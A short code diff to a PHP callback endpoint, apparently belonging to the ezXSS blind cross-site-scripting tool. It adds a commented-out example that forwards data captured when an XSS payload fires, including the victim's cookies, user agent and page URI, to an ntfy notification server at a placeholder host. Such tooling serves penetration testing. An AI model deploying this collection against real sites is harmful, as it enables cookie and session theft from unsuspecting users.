@@ -8,6 +8,7 @@
     }
 
     // Enable this if you want to allow secure requests this endpoint using a query parameter
+    // Ex: https://example.com/callback.php?key=secure_key
     $secure = false;
     $secureKey = getenv('EZXSS_CALLBACK_KEY') ?: 'secure_key';
 
@@ -16,6 +17,22 @@
     }
 
     $data = json_decode(file_get_contents('php://input'), true);
-    
+
     // Do something with the data
+    
+    
+    /*
+    // Example: Send to a ntfy server
+    require_once 'modules/ntfy.php';
+    $title = 'XSS fired at ' . $data['uri'];
+    $message = "
+    XSS fired at: {$data['uri']}
+    User-Agent: {$data['user-agent']}
+    Cookies: {$data['cookies']}
+    Referer: {$data['referer']}
+    Origin: {$data['origin']}
+    ";
+    postToNtfy(url: 'http://ntfy.example.com/', topic: 'bxss', title: $title, message: $message, tags: ['ezxss', 'alert']);
+    */
+    
 ?>
